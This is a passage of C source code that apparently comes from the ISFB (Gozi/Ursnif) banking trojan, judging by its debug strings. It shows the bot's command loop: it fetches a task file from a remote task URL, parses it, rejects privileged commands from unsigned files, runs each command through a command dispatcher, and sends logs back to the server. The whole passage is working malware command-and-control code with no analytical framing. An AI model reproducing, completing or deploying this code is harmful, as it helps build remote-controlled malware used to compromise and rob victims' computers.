						if (IsPrivilegedCommand(pCommands->Parameter[i].NameHash))
						{
							DbgPrint("ISFB_%04x: A privileged command %x found within unsigned file\n", g_CurrentProcessId, pCommands->Parameter[i].NameHash);
							LogWrite(szLogCmdParsing, i + 1, ERROR_ACCESS_DENIED);
							pCommands->Count = 0;
							break;
						}
					}	// for (i=0; i<pCommands->Count; i++)
				}	// if (!OrigSize)
#endif
				for (i=0; i<pCommands->Count; i++)
				{
					DbgPrint("ISFB_%04x: Command %x received\n", g_CurrentProcessId, pCommands->Parameter[i].NameHash);

					Status = ClientProcessCommand(
						pCommands->Parameter[i].NameHash, 
						pCommands->Parameter[i].pValue, 
						pCommands->Parameter[i].pUid
						);

					DbgPrint("ISFB_%04x: Command %x processed with status %u\n", g_CurrentProcessId, pCommands->Parameter[i].NameHash, Status);
					if (pCommands->Parameter[i].pUid)
						LogWrite(szLogCmdProcessed, pCommands->Parameter[i].pUid, Status);
				}	// for (i=1; i<pCommands->Count; i++)
				hFree(pCommands);
				DbgPrint("ISFB_%04x: Command file processed.\n", g_CurrentProcessId);
			}	// if ((Status = IniParseParamFile(pBuffer, '|', '=', &pCommands, TRUE, FALSE, g_CsCookie)) == NO_ERROR)
			else
			{
				DbgPrint("ISFB_%04x: Error parsing command file %u\n", g_CurrentProcessId, Status);
				LogWrite(szLogCmdParsing, 0, Status);
			}
		}	// if (Size...

#ifdef _PRIVILEGED_COMMANDS
		// Sending log
		GetAndSendData(CMD_GET_LOG, SEND_ID_LOG, LOG_SIZE_MAX, szLogFailed, szLog);	
#endif
	
		hFree(pBuffer);
	}	// if ((Status = ConfRequestData(g_TaskURL, 0, FALSE, &Buffer, &Size)) == NO_ERROR)
	else
	{
		DbgPrint("ISFB_%04x: Command request failed with status %u.\n", g_CurrentProcessId, Status);
	}
}